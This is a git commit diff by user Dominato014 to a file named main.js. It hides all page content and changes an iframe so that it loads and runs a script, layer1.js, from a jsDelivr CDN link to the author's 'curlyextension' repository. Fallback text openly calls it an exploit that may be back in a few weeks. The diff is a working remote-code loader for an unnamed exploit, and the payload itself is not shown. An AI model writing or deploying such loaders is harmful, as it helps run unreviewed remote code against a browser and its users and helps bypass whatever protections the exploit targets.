05beaad4d9875d00bc9c07b588a70dce7571807e
Dominato014 <68794129+Dominato014@users.noreply.github.com>
2023-10-29 14:53:23 -0500

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,5 @@
 <style>*{visibility:hidden}</style>
-    <iframe srcdoc="<script src='layer1.js'></script>">
+    <iframe srcdoc="<script src='https://cdn.jsdelivr.net/gh/Dominato014/curlyextension@latest/layer1.js'></script>">
         Hi. If you can read this, the exploit didn't work.
         Wait a couple of weeks. We'll be back...
     </iframe>
